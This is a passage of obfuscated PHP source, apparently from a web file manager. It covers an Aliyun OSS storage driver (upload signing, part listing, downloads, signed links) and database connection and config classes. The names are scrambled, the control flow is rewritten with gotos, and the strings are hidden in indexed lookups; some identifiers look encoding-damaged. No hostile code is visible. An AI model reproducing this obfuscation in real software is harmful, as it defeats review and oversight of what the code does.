(!empty($dÛã£ë®˜Š[$FôæÙ¡‚œÏ[1318]])) { $CˆŠá÷œÃ = array_merge(array($fçŞ§ñ‹í¡[4]), $dÛã£ë®˜Š[$FôæÙ¡‚œÏ[1318]]); sort($CˆŠá÷œÃ); $fçŞ§ñ‹í¡[4] = implode($FôæÙ¡‚œÏ[229], $CˆŠá÷œÃ); } $a‰†—°¿×ñ = implode($FôæÙ¡‚œÏ[229], $fçŞ§ñ‹í¡); $eÄ•Ô‚›‹¹ = base64_encode(hash_hmac($FôæÙ¡‚œÏ[230], $a‰†—°¿×ñ, $this->secret, !0)); goto B®ïÛø ¿ƒ; B®ïÛø ¿ƒ: $c’ä§·ƒ¨¤ = $FôæÙ¡‚œÏ[1282] . $this->accessKey . $FôæÙ¡‚œÏ[4] . $eÄ•Ô‚›‹¹; if (strpos($EõÒàÒæŸ, $FôæÙ¡‚œÏ[225]) === 0) { $c’ä§·ƒ¨¤ = array($FôæÙ¡‚œÏ[232] => $c’ä§·ƒ¨¤, $FôæÙ¡‚œÏ[222] => $fÆˆ­²òÕô); if ($a¬ÇšÌœÎ³) { $c’ä§·ƒ¨¤ = array_merge($c’ä§·ƒ¨¤, $a¬ÇšÌœÎ³); } } return $c’ä§·ƒ¨¤; goto AáÔ½÷©¯; f©©ãÓÂÄØ: $FôæÙ¡‚œÏ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $fÆˆ­²òÕô = isset($dÛã£ë®˜Š[$FôæÙ¡‚œÏ[222]]) ? $dÛã£ë®˜Š[$FôæÙ¡‚œÏ[222]] : gmdate($FôæÙ¡‚œÏ[1316]); $EõÒàÒæŸ = isset($dÛã£ë®˜Š[$FôæÙ¡‚œÏ[168]]) ? $dÛã£ë®˜Š[$FôæÙ¡‚œÏ[168]] : $FôæÙ¡‚œÏ[33]; goto f‚¨ÂİÒë; f‚¨ÂİÒë: $AÄáÎ¼È§Û = $dİ–É“ëÓÌ; if (isset($dÛã£ë®˜Š[$FôæÙ¡‚œÏ[93]])) { $AÄáÎ¼È§Û = $dÛã£ë®˜Š[$FôæÙ¡‚œÏ[93]]; unset($dÛã£ë®˜Š[$FôæÙ¡‚œÏ[93]]); } if (isset($dÛã£ë®˜Š[$FôæÙ¡‚œÏ[223]])) { $dÛã£ë®˜Š[$FôæÙ¡‚œÏ[222]] = $fÆˆ­²òÕô; return $this->listUploadParts($AÄáÎ¼È§Û, $dÛã£ë®˜Š); } goto fĞè¿Æƒº; fĞè¿Æƒº: $fçŞ§ñ‹í¡ = array($FôæÙ¡‚œÏ[224], $FôæÙ¡‚œÏ[33], $FôæÙ¡‚œÏ[119], $fÆˆ­²òÕô, "\170\x2d\157\x73\x73\55\x64\x61\x74\145\x3a{$fÆˆ­²òÕô}", $FôæÙ¡‚œÏ[8] . $this->bucket . $FôæÙ¡‚œÏ[8] . $AÄáÎ¼È§Û . $EõÒàÒæŸ); if (strpos($EõÒàÒæŸ, $FôæÙ¡‚œÏ[225]) === 0) { $fçŞ§ñ‹í¡[0] = $FôæÙ¡‚œÏ[226]; if ($a¬ÇšÌœÎ³ = $this->trafficLimit($FôæÙ¡‚œÏ[1308])) { $AÄáÎ¼È§Û = $FôæÙ¡‚œÏ[1317]; array_splice($fçŞ§ñ‹í¡, 5, 0, $AÄáÎ¼È§Û . $FôæÙ¡‚œÏ[4] . $a¬ÇšÌœÎ³[$AÄáÎ¼È§Û]); } } if (isset($dÛã£ë®˜Š[$FôæÙ¡‚œÏ[227]]) && $dÛã£ë®˜Š[$FôæÙ¡‚œÏ[227]] == $FôæÙ¡‚œÏ[228]) { $fçŞ§ñ‹í¡[0] = $FôæÙ¡‚œÏ[228]; } goto c®öíëÁˆË; AáÔ½÷©¯: } public function listUploadParts($eˆ£ø®ä¨¥, $fËÚê¾’µ¬) { goto D›ÉÙ²¸Ë; EğÓÏŞ°Œ±: unset($fËÚê¾’µ¬[$D£Ú·¡ï[223]], $fËÚê¾’µ¬[$D£Ú·¡ï[227]]); $D¡Å§…Æó³ = $this->multiUploadAuthData($eˆ£ø®ä¨¥, $fËÚê¾’µ¬); if (empty($D¡Å§…Æó³)) { return !1; } goto Fæ¦°®°ÆŞ; dÚÙÃõ»­¬: $bš”ÈºÅ¡ = $e×óÃõ³«ä->getListPart(); $f£ò¸ğ˜Ì = array(); foreach ($bš”ÈºÅ¡ as $f¾×±‘©Èä) { $f£ò¸ğ˜Ì[] = array($D£Ú·¡ï[1302] => $f¾×±‘©Èä->getPartNumber(), $D£Ú·¡ï[1303] => trim($f¾×±‘©Èä->getETag(), $D£Ú·¡ï[116])); } goto EğÓÏŞ°Œ±; Fæ¦°®°ÆŞ: return array($D£Ú·¡ï[232] => $D¡Å§…Æó³, $D£Ú·¡ï[222] => $fËÚê¾’µ¬[$D£Ú·¡ï[222]], $D£Ú·¡ï[234] => $f£ò¸ğ˜Ì); goto f›¶ç…Ü†; D›ÉÙ²¸Ë: $D£Ú·¡ï =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $d³‚áğá‘ = parse_url_query($fËÚê¾’µ¬[$D£Ú·¡ï[168]]); $e×óÃõ³«ä = $this->client->listParts($this->bucket, $this->pathEncode($eˆ£ø®ä¨¥), $d³‚áğá‘[$D£Ú·¡ï[221]]); goto dÚÙÃõ»­¬; f›¶ç…Ü†: } public function download($B­–ƒ÷¦Û, $EÈ‘±í«¦) { if ($this->isFolder($B­–ƒ÷¦Û)) { return !1; } try { $FÍ¥†ƒŠ¶ = array(OSS\OssClient::OSS_FILE_DOWNLOAD => $EÈ‘±í«¦); $FÍ¥†ƒŠ¶ = $this->trafficLimit($_SERVER[Ôğ—¤Šµˆ˜ñ£][109], $FÍ¥†ƒŠ¶); $this->client->getObject($this->bucket, $this->pathEncode($B­–ƒ÷¦Û), $FÍ¥†ƒŠ¶); } catch (OSS\Core\OssException $DÛ¢Ã¿¥Ö) { return !1; } return $EÈ‘±í«¦; } public function fileSubstr($D­äæ‘²Íõ, $D´í–İŠ©µ = 0, $d…ŒÏ”  = false) { if ($D´í–İŠ©µ === -1) { $Dğèßƒ¥Î = array(); } else { if ($d…ŒÏ”  === !1) { $f¯íƒ¯—š = $this->size($D­äæ‘²Íõ); } else { $f¯íƒ¯—š = $D´í–İŠ©µ + $d…ŒÏ”  - 1; } $Dğèßƒ¥Î = array(OSS\OssClient::OSS_RANGE => "{$D´í–İŠ©µ}\x2d{$f¯íƒ¯—š}"); } try { return $this->client->getObject($this->bucket, $this->pathEncode($D­äæ‘²Íõ), $Dğèßƒ¥Î); } catch (OSS\Core\OssException $B•ŒµéÃ„š) { think_exception($B•ŒµéÃ„š->getMessage()); return !1; } } private function trafficLimit($c£¨“óË¦, $B¼‚ï”¬ˆ = array()) { goto d·äÛ‡Æ¨; f­“Õ¢‡†¬: return $B¼‚ï”¬ˆ; goto b³†³åªØ; d·äÛ‡Æ¨: $A‚Í¼§ÚÏ” =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if ($c£¨“óË¦ == $A‚Í¼§ÚÏ”[1308] && $this->isUploadServer() || $c£¨“óË¦ == $A‚Í¼§ÚÏ”[109] && $this->isFileOutServer()) { return $B¼‚ï”¬ˆ; } $BÆğ†† = floatval($GLOBALS[$A‚Í¼§ÚÏ”[6]][$A‚Í¼§ÚÏ”[88]][$A‚Í¼§ÚÏ”[107]][$c£¨“óË¦]) * 1024 * 1024 * 8; goto f‹à‹‚›Ï•; f‹à‹‚›Ï•: if (!$BÆğ††) { return $B¼‚ï”¬ˆ; } $BÆğ†† = $BÆğ†† < 819200 ? 819200 : ($BÆğ†† > 838860800 ? 838860800 : $BÆğ††); $B¼‚ï”¬ˆ[OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($BÆğ††); goto f­“Õ¢‡†¬; b³†³åªØ: } public function link($dâ¤²‡Æ, $aÛßÄî–ºï = array()) { $fÃõÃ¤ÖË® =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if (!$this->exist($dâ¤²‡Æ) || $this->isFolder($dâ¤²‡Æ)) { return !1; } try { $aÛßÄî–ºï = $this->trafficLimit($fÃõÃ¤ÖË®[109], $aÛßÄî–ºï); $c©­á–‰» = $this->client->signUrl($this->bucket, $this->pathEncode($dâ¤²‡Æ), 3600 * 12, $fÃõÃ¤ÖË®[228], $aÛßÄî–ºï); return $this->getCdnLink($c©­á–‰»); } catch (OSS\Core\OssException $B±ß··†ê‚) { return !1; } } public function fileOut($eöÅİ­Òê¦, $DÀè­‰ëøô = false, $AäÆ¶¦šëè = false, $e†Ó¥†ÕÊÄ = '') { goto EšÔ—¦±‘Š; a”œÀøê ±: $AäÆ¶¦šëè = rawurlencode($AäÆ¶¦šëè); $AÀ¬§§¿ºƒ = get_file_mime(get_path_ext($AäÆ¶¦šëè)); if ($AÀ¬§§¿ºƒ == $fÕ¡äöÚ¾Ò[213]) { return parent::fileOut($eöÅİ­Òê¦, $DÀè­‰ëøô, $AäÆ¶¦šëè, $e†Ó¥†ÕÊÄ); } goto dŸ»‚ÈÅ¥‹; F„ŸÜàøé: $F“±µ ¿­ó = $this->link($eöÅİ­Òê¦, $féŠ‘«ĞÚÙ); $this->fileOutLink($F“±µ ¿­ó); goto Cˆæ²ğƒí´; dŸ»‚ÈÅ¥‹: $DÀè­‰ëøô = $DÀè­‰ëøô ? $fÕ¡äöÚ¾Ò[214] : $fÕ¡äöÚ¾Ò[215]; $féŠ‘«ĞÚÙ = array(OSS\OssClient::OSS_SUB_RESOURCE => $fÕ¡äöÚ¾Ò[1319] . rawurlencode("{$DÀè­‰ëøô}\x3b\x66\151\x6c\145\x6e\141\155\145\75{$AäÆ¶¦šëè}")); $féŠ‘«ĞÚÙ[OSS\OssClient::OSS_SUB_RESOURCE] .= $fÕ¡äöÚ¾Ò[1320] . rawurlencode($AÀ¬§§¿ºƒ); goto F„ŸÜàøé; EšÔ—¦±‘Š: $fÕ¡äöÚ¾Ò =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if ($this->isFileOutServer()) { return $this->fileOutServer($eöÅİ­Òê¦, $DÀè­‰ëøô, $AäÆ¶¦šëè, $e†Ó¥†ÕÊÄ); } if (!$AäÆ¶¦šëè) { $AäÆ¶¦šëè = $this->pathThis($eöÅİ­Òê¦); } goto a”œÀøê ±; Cˆæ²ğƒí´: } public function fileOutServer($F²…ï¶Ùò‹, $BíÎá…®áÑ = false, $a¸ùºÊ¶æ = false, $Cß—áä®¶ = '') { parent::fileOut($F²…ï¶Ùò‹, $BíÎá…®áÑ, $a¸ùºÊ¶æ, $Cß—áä®¶); } public function fileOutImage($Cá†¢™òë–, $dÓ¶ñë¨–‹ = 250) { $fÂ®¦„ƒŞ” = array(OSS\OssClient::OSS_PROCESS => $_SERVER[Ôğ—¤Šµˆ˜ñ£][1321] . $dÓ¶ñë¨–‹); $Cí¾ÕÆš‘ = $this->link($Cá†¢™òë–, $fÂ®¦„ƒŞ”); $this->fileOutLink($Cí¾ÕÆš‘); } public function fileOutImageServer($AïŞæÛğŞš, $aÉƒŠŸç¢¡ = 250) { parent::fileOutImage($AïŞæÛğŞš, $aÉƒŠŸç¢¡); } public function fileOutLink($c“Ÿ‡êË‚) { $Då£Ğë“ÃŠ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if (!$this->isCdnHost() && substr($c“Ÿ‡êË‚, 0, 7) == $Då£Ğë“ÃŠ[1225]) { $c“Ÿ‡êË‚ = $Då£Ğë“ÃŠ[1226] . substr($c“Ÿ‡êË‚, 7); } header($Då£Ğë“ÃŠ[159] . $c“Ÿ‡êË‚); die; } public function hashMd5($d¸¢¯“¢ñ‚, $E¶¶ˆµµÍÖ = '') { $Bœò¡¦Ÿ ¾ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $C¨ç·àÔö = $this->_objectMeta($d¸¢¯“¢ñ‚); if (!$C¨ç·àÔö) { return $Bœò¡¦Ÿ ¾[33]; } if (!isset($C¨ç·àÔö[$Bœò¡¦Ÿ ¾[1298]]) && !empty($E¶¶ˆµµÍÖ)) { $e¨Ñ¥ãƒï = $this->updateObjMeta($d¸¢¯“¢ñ‚, array($Bœò¡¦Ÿ ¾[1298] => $E¶¶ˆµµÍÖ)); $C¨ç·àÔö[$Bœò¡¦Ÿ ¾[1298]] = $e¨Ñ¥ãƒï ? $E¶¶ˆµµÍÖ : $Bœò¡¦Ÿ ¾[33]; } return isset($C¨ç·àÔö[$Bœò¡¦Ÿ ¾[1298]]) ? strtolower($C¨ç·àÔö[$Bœò¡¦Ÿ ¾[1298]]) : $Bœò¡¦Ÿ ¾[33]; } public function size($C¸¦Û…—òá) { $béÛÀœóĞ„ = $this->objectMeta($C¸¦Û…—òá); return $béÛÀœóĞ„ ? $béÛÀœóĞ„[$_SERVER[Ôğ—¤Šµˆ˜ñ£][78]] : 0; } public function info($CõÊ²«Û’) { if ($this->isFolder($CõÊ²«Û’)) { return $this->folderInfo($CõÊ²«Û’); } else { if ($this->isFile($CõÊ²«Û’)) { return $this->fileInfo($CõÊ²«Û’); } } return !1; } public function exist($c·ƒÕ­ª¹) { return $this->isFile($c·ƒÕ­ª¹) || $this->isFolder($c·ƒÕ­ª¹); } public function isFile($eÛÌÕÜé¬) { return !$this->isFolder($eÛÌÕÜé¬) && $this->objectMeta($eÛÌÕÜé¬); } public function isFolder($E›ÔÎš®…å) { return $this->cacheMethod($_SERVER[Ôğ—¤Šµˆ˜ñ£][199], $E›ÔÎš®…å); } protected function objectMeta($a¾ĞòÅ¶‡) { return $this->cacheMethod($_SERVER[Ôğ—¤Šµˆ˜ñ£][200], $a¾ĞòÅ¶‡); } protected function _objectMeta($fŞ²”Ô¤·‡) { $b™”ßíº‹´ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; try { $E¸è®®ïÚˆ = $this->client->getObjectMeta($this->bucket, $this->pathEncode($fŞ²”Ô¤·‡)); } catch (OSS\Core\OssException $B¹â–”) { $E¸è®®ïÚˆ = !1; } if ($E¸è®®ïÚˆ) { $E¸è®®ïÚˆ[$b™”ßíº‹´[78]] = intval($E¸è®®ïÚˆ[$b™”ßíº‹´[1296]]); } return $E¸è®®ïÚˆ; } protected function _isFolder($e§å„ó™®Ö) { $AŞ¡‡À„Ê† =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if ($e§å„ó™®Ö == $AŞ¡‡À„Ê†[33] || $e§å„ó™®Ö == $AŞ¡‡À„Ê†[8]) { return !0; } $dÂêÒÂå¿Í = array($AŞ¡‡À„Ê†[1292] => $AŞ¡‡À„Ê†[8], $AŞ¡‡À„Ê†[1293] => rtrim($e§å„ó™®Ö, $AŞ¡‡À„Ê†[8]) . $AŞ¡‡À„Ê†[8], $AŞ¡‡À„Ê†[1294] => 1, $AŞ¡‡À„Ê†[1295] => $AŞ¡‡À„Ê†[33]); $aôŒ¨Ñõ¾ = $this->client->listObjects($this->bucket, $dÂêÒÂå¿Í); if ($aôŒ¨Ñõ¾->getObjectList() || $aôŒ¨Ñõ¾->getPrefixList()) { return !0; } return !1; } } goto d“¨—ƒÎ¦Ÿ; e–»–ï¼æ: class DbSqlite extends DbSqliteBase { public function query($AŠ´´ˆìÁÑ) { $BÏ‹Í¼Ú¸ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if (!CacheLock::fileLock($BÏ‹Í¼Ú¸[9])) { return !1; } $cÕß½§»›é = parent::query($AŠ´´ˆìÁÑ); CacheLock::fileUnLock($BÏ‹Í¼Ú¸[9]); return $cÕß½§»›é; } public function execute($bùƒŒàÜØŒ) { $B„¢Î›Ù÷ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if (!CacheLock::fileLock($B„¢Î›Ù÷[9])) { return !1; } $A…ø×ÔÎ = parent::execute($bùƒŒàÜØŒ); CacheLock::fileUnLock($B„¢Î›Ù÷[9]); return $A…ø×ÔÎ; } } class DbSqlite3 extends DbSqlite3Base { public function query($bâ¬×¾¯æ¦) { $CÆá§ Îš =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if (!CacheLock::fileLock($CÆá§ Îš[9])) { return !1; } $b•´àöÙÔŸ = parent::query($bâ¬×¾¯æ¦); CacheLock::fileUnLock($CÆá§ Îš[9]); return $b•´àöÙÔŸ; } public function execute($EÛ¨ãöÚ¥œ) { $BœËÊ…ùô‘ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if (!CacheLock::fileLock($BœËÊ…ùô‘[9])) { return !1; } $C•‚Œ˜° = parent::execute($EÛ¨ãöÚ¥œ); CacheLock::fileUnLock($BœËÊ…ùô‘[9]); return $C•‚Œ˜°; } } class Db { protected $dbType = null; protected $autoFree = false; protected $model = "\x5f\164\150\151\x6e\153\x5f"; protected $pconnect = false; protected $queryStr = ''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = ''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; protected $connected = false; protected $config = ''; protected $configLast = ''; protected $exp = array("\x65\x71" => "\75", "\156\145\161" => "\x3c\x3e", "\x67\164" => "\x3e", "\145\147\x74" => "\x3e\x3d", "\x6c\164" => "\74", "\x65\x6c\x74" => "\74\x3d", "\156\x6f\x74\x6c\x69\x6b\x65" => "\116\117\124\x20\x4c\x49\113\105", "\154\x69\153\145" => "\x4c\x49\113\105", "\x69\x6e" => "\x49\116", "\x6e\x6f\164\x69\x6e" => "\116\117\124\x20\x49\116", "\x6e\x6f\164\40\151\156" => "\116\x4f\124\x20\x49\x4e", "\142\145\164\x77\145\145\x6e" => "\102\105\x54\x57\105\105\116", "\x6e\157\x74\x62\x65\164\x77\x65\145\156" => "\116\x4f\124\x20\x42\105\x54\x57\105\x45\116", "\x6e\x6f\x74\x20\142\145\x74\167\x65\x65\x6e" => "\116\x4f\124\40\x42\105\124\x57\105\x45\116"); protected $selectSql = "\123\105\x4c\x45\x43\x54\45\104\111\x53\124\111\x4e\103\124\45\40\45\106\111\105\x4c\104\45\40\x46\x52\x4f\115\x20\x25\124\x41\x42\x4c\x45\x25\x25\112\117\x49\116\45\x25\127\x48\105\x52\x45\x25\45\x47\122\117\x55\x50\45\45\110\x41\x56\111\x4e\x47\x25\45\x4f\x52\x44\105\x52\45\45\x4c\x49\115\111\124\45\x20\x25\x55\116\111\x4f\x4e\x25\45\x43\x4f\115\x4d\x45\x4e\x54\x25"; protected $bind = array(); public static function getInstance() { $aóÙ”öößœ = func_get_args(); return think_get_instance_of(__CLASS__, $_SERVER[Ôğ—¤Šµˆ˜ñ£][942], $aóÙ”öößœ); } public function factory($EÇç“Éôç = '') { goto Bùº÷‹Ê˜ô; D‡‚¤Ê­î…: return $B‹³òÛ¼Å†; goto d†åÀ™Áöã; EÊ²Ü×â³©: $this->dbType = ucwords(strtolower($EÇç“Éôç[$C²ÃàŠæ¦ª[943]])); $E†¹ëÔ‡á¥ = $C²ÃàŠæ¦ª[945] . $this->dbType; if (class_exists($E†¹ëÔ‡á¥)) { $B‹³òÛ¼Å† = new $E†¹ëÔ‡á¥($EÇç“Éôç); if ($C²ÃàŠæ¦ª[778] != strtolower($EÇç“Éôç[$C²ÃàŠæ¦ª[943]])) { $B‹³òÛ¼Å†->dbType = strtoupper($this->dbType); } else { $B‹³òÛ¼Å†->dbType = $this->_getDsnType($EÇç“Éôç[$C²ÃàŠæ¦ª[898]]); } } else { think_exception(think_lang($C²ÃàŠæ¦ª[946]) . $C²ÃàŠæ¦ª[947] . $E†¹ëÔ‡á¥); } goto D‡‚¤Ê­î…; Bùº÷‹Ê˜ô: $C²ÃàŠæ¦ª =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $EÇç“Éôç = $this->parseConfig($EÇç“Éôç); if (empty($EÇç“Éôç[$C²ÃàŠæ¦ª[943]])) { think_exception(think_lang($C²ÃàŠæ¦ª[944])); } goto EÊ²Ü×â³©; d†åÀ™Áöã: } public function __call($FÈÌÅ õ¯–, $EŒÖËÅÒÃ) { if (method_exists($this, $FÈÌÅ õ¯–)) { return call_user_func_array(array($this, $FÈÌÅ õ¯–), $EŒÖËÅÒÃ); } } protected function _getDsnType($d¡±çæÌ£ä) { $Fã¾“”¿øÂ = explode($_SERVER[Ôğ—¤Šµˆ˜ñ£][4], $d¡±çæÌ£ä); $FÃâ÷‰¥¤¥ = strtoupper(trim($Fã¾“”¿øÂ[0])); return $FÃâ÷‰¥¤¥; } private function parseConfig($E‡ë·Á§†ø = '') { $aó™òó÷Êµ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if (!empty($E‡ë·Á§†ø) && is_string($E‡ë·Á§†ø)) { $E‡ë·Á§†ø = $this->parseDSN($E‡ë·Á§†ø); } elseif (is_array($E‡ë·Á§†ø)) { $E‡ë·Á§†ø = array_change_key_case($E‡ë·Á§†ø); $E‡ë·Á§†ø = array($aó™òó÷Êµ[943] => $E‡ë·Á§†ø[$aó™òó÷Êµ[777]], $aó™òó÷Êµ[871] => $E‡ë·Á§†ø[$aó™òó÷Êµ[948]], $aó™òó÷Êµ[872] => $E‡ë·Á§†ø[$aó™òó÷Êµ[949]], $aó™òó÷Êµ[869] => $E‡ë·Á§†ø[$aó™òó÷Êµ[950]], $aó™òó÷Êµ[870] => $E‡ë·Á§†ø[$aó™òó÷Êµ[951]], $aó™òó÷Êµ[17] => $E‡ë·Á§†ø[$aó™òó÷Êµ[952]], $aó™òó÷Êµ[898] => $E‡ë·Á§†ø[$aó™òó÷Êµ[779]], $aó™òó÷Êµ[13] => isset($E‡ë·Á§†ø[$aó™òó÷Êµ[953]]) ? $E‡ë·Á§†ø[$aó™òó÷Êµ[953]] : array()); } elseif (empty($E‡ë·Á§†ø)) { if (think_config($aó™òó÷Êµ[954]) && $aó™òó÷Êµ[778] != strtolower(think_config($aó™òó÷Êµ[955]))) { $E‡ë·Á§†ø = $this->parseDSN(think_config($aó™òó÷Êµ[954])); } else { $E‡ë·Á§†ø = array($aó™òó÷Êµ[943] => think_config($aó™òó÷Êµ[955]), $aó™òó÷Êµ[871] => think_config($aó™òó÷Êµ[956]), $aó™òó÷Êµ[872] => think_config($aó™òó÷Êµ[957]), $aó™òó÷Êµ[869] => think_config($aó™òó÷Êµ[958]), $aó™òó÷Êµ[870] => think_config($aó™òó÷Êµ[959]), $aó™òó÷Êµ[17] => think_config($aó™òó÷Êµ[244]), $aó™òó÷Êµ[898] => think_config($aó™òó÷Êµ[954]), $aó™òó÷Êµ[13] => think_config($aó™òó÷Êµ[960])); } } return $E‡ë·Á§†ø; } protected function initConnect($EÖÇîÜùôß = true) { if (1 == think_config($_SERVER[Ôğ—¤Šµˆ˜ñ£][18])) { $this->_linkID = $this->multiConnect($EÖÇîÜùôß); } else { if ($this->config) { $this->configLast = $this->config; } } if (!$this->connected) { $this->_linkID = $this->connect(); } } protected function closeConnect() { if (!$this->connected) { return; } foreach ($this->linkID as $bäø·ÌÃî => $E’ÜÉóŸ»Ë) { $this->_linkID = $E’ÜÉóŸ»Ë; $this->close(); } $this->linkID = array(); $this->_linkID = null; $this->connected = !1; if (!$this->config && $this->configLast) { $this->config = $this->configLast; } } protected function multiConnect($bÑŠ¦ô©Ø = false) { goto f„¦¹æ³; B¼„Ò¸øÙê: $CÏÊ»†Äç = array($D±åéêÀšÒ[871] => isset($fÚĞÑ‚Ë[$D±åéêÀšÒ[871]][$F¬ÎøßØÜ«]) ? $fÚĞÑ‚Ë[$D±åéêÀšÒ[871]][$F¬ÎøßØÜ«] : $fÚĞÑ‚Ë[$D±åéêÀšÒ[871]][0], $D±åéêÀšÒ[872] => isset($fÚĞÑ‚Ë[$D±åéêÀšÒ[872]][$F¬ÎøßØÜ«]) ? $fÚĞÑ‚Ë[$D±åéêÀšÒ[872]][$F¬ÎøßØÜ«] : $fÚĞÑ‚Ë[$D±åéêÀšÒ[872]][0], $D±åéêÀšÒ[869] => isset($fÚĞÑ‚Ë[$D±åéêÀšÒ[869]][$F¬ÎøßØÜ«]) ? $fÚĞÑ‚Ë[$D±åéêÀšÒ[869]][$F¬ÎøßØÜ«] : $fÚĞÑ‚Ë[$D±åéêÀšÒ[869]][0], $D±åéêÀšÒ[870] => isset($fÚĞÑ‚Ë[$D±åéêÀšÒ[870]][$F¬ÎøßØÜ«]) ? $fÚĞÑ‚Ë[$D±åéêÀšÒ[870]][$F¬ÎøßØÜ«] : $fÚĞÑ‚Ë[$D±åéêÀšÒ[870]][0], $D±åéêÀšÒ[17] => isset($fÚĞÑ‚Ë[$D±åéêÀšÒ[17]][$F¬ÎøßØÜ«]) ? $fÚĞÑ‚Ë[$D±åéêÀšÒ[17]][$F¬ÎøßØÜ«] : $fÚĞÑ‚Ë[$D±åéêÀšÒ[17]][0], $D±åéêÀšÒ[898] => isset($fÚĞÑ‚Ë[$D±åéêÀšÒ[898]][$F¬ÎøßØÜ«]) ? $fÚĞÑ‚Ë[$D±åéêÀšÒ[898]][$F¬ÎøßØÜ«] : $fÚĞÑ‚Ë[$D±åéêÀšÒ[898]][0], $D±åéêÀšÒ[13] => isset($fÚĞÑ‚Ë[$D±åéêÀšÒ[13]][$F¬ÎøßØÜ«]) ? $fÚĞÑ‚Ë[$D±åéêÀšÒ[13]][$F¬ÎøßØÜ«] : $fÚĞÑ‚Ë[$D±åéêÀšÒ[13]][0]); return $this->connect($CÏÊ»†Äç, $F¬ÎøßØÜ«); goto F¤ˆƒÓ©ˆÃ; f„¦¹æ³: $D±åéêÀšÒ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; static $fÚĞÑ‚Ë = array(); static $c‚‰Ò¥¶ƒ¤ = -1; goto eà„ááí‘; eà„ááí‘: if (empty($fÚĞÑ‚Ë)) { foreach ($this->config as $F¹¤ÛÄêÕ¤ => $A”êÆ¼®œÜ) { $fÚĞÑ‚Ë[$F¹¤ÛÄêÕ¤] = explode($D±åéêÀšÒ[47], $A”êÆ¼®œÜ); } } if (think_config($D±åéêÀšÒ[961])) { if ($bÑŠ¦ô©Ø || think_config($D±åéêÀšÒ[391]) === !0) { $F¬ÎøßØÜ« = floor(mt_rand(0, think_config($D±åéêÀšÒ[962]) - 1)); $c‚‰Ò¥¶ƒ¤ = $F¬ÎøßØÜ«; } else { if (is_numeric(think_config($D±åéêÀšÒ[963]))) { $F¬ÎøßØÜ« = think_config($D±åéêÀšÒ[963]); } else { $F¬ÎøßØÜ« = floor(mt_rand(think_config($D±åéêÀšÒ[962]), count($fÚĞÑ‚Ë[$D±åéêÀšÒ[869]]) - 1)); } } } else { $F¬ÎøßØÜ« = floor(mt_rand(0, count($fÚĞÑ‚Ë[$D±åéêÀšÒ[869]]) - 1)); $c‚‰Ò¥¶ƒ¤ = $F¬ÎøßØÜ«; } $F¬ÎøßØÜ« = $c‚‰Ò¥¶ƒ¤ !== -1 ? $c‚‰Ò¥¶ƒ¤ : $F¬ÎøßØÜ«; goto B¼„Ò¸øÙê; F¤ˆƒÓ©ˆÃ: } public function parseDSN($E·Ó†¾á) { $D½ùï‰« =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if (empty($E·Ó†¾á)) { return !1; } $aª×¶µ¡Ú = parse_url($E·Ó†¾á); if ($aª×¶µ¡Ú[$D½ùï‰«[174]]) { $dçó¼Ì‹Â = array($D½ùï‰«[943] => $aª×¶µ¡Ú[$D½ùï‰«[174]], $D½ùï‰«[871] => isset($aª×¶µ¡Ú[$D½ùï‰«[588]]) ? $aª×¶µ¡Ú[$D½ùï‰«[588]] : $D½ùï‰«[33], $D½ùï‰«[872] => isset($aª×¶µ¡Ú[$D½ùï‰«[964]]) ? $aª×¶µ¡Ú[$D½ùï‰«[964]] : $D½ùï‰«[33], $D½ùï‰«[869] => isset($aª×¶µ¡Ú[$D½ùï‰«[175]]) ? $aª×¶µ¡Ú[$D½ùï‰«[175]] : $D½ùï‰«[33], $D½ùï‰«[870] => isset($aª×¶µ¡Ú[$D½ùï‰«[176]]) ? $aª×¶µ¡Ú[$D½ùï‰«[176]] : $D½ùï‰«[33], $D½ùï‰«[17] => isset($aª×¶µ¡Ú[$D½ùï‰«[76]]) ? substr($aª×¶µ¡Ú[$D½ùï‰«[76]], 1) : $D½ùï‰«[33]); } else { preg_match($D½ùï‰«[965], trim($E·Ó†¾á), $a¢ïµ–Çˆ); $dçó¼Ì‹Â = array($D½ùï‰«[943] => $a¢ïµ–Çˆ[1], $D½ùï‰«[871] => $a¢ïµ–Çˆ[2], $D½ùï‰«[872] => $a¢ïµ–Çˆ[3], $D½ùï‰«[869] => $a¢ïµ–Çˆ[4], $D½ùï‰«[870] => $a¢ïµ–Çˆ[5], $D½ùï‰«[17] => $a¢ïµ–Çˆ[6]); } $dçó¼Ì‹Â[$D½ùï‰«[898]] = $D½ùï‰«[33]; return $dçó¼Ì‹Â; } protected function debug() { $AáãöÚõô£ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $AáãöÚõô£[966]; if (think_config($AáãöÚõô£[967])) { think_status($AáãöÚõô£[968]); think_trace($this->queryStr . $AáãöÚõô£[969] . think_status($AáãöÚõô£[20], $AáãöÚõô£[968], 6) . $AáãöÚõô£[970], $AáãöÚõô£[33], $AáãöÚõô£[971]); } } protected function parseLock($Díö˜×®©Ã = false) { $dğÕÊØ«“¸ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if (!$Díö˜×®©Ã) { return $dğÕÊØ«“¸[33]; } if ($dğÕÊØ«“¸[900] == $this->dbType) { return $dğÕÊØ«“¸[972]; } return $dğÕÊØ«“¸[973]; } protected function parseSet($bß–Ùè»È) { $Dåùºò¸ó =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; foreach ($bß–Ùè»È as $aØÍİƒé­ => $BÊ 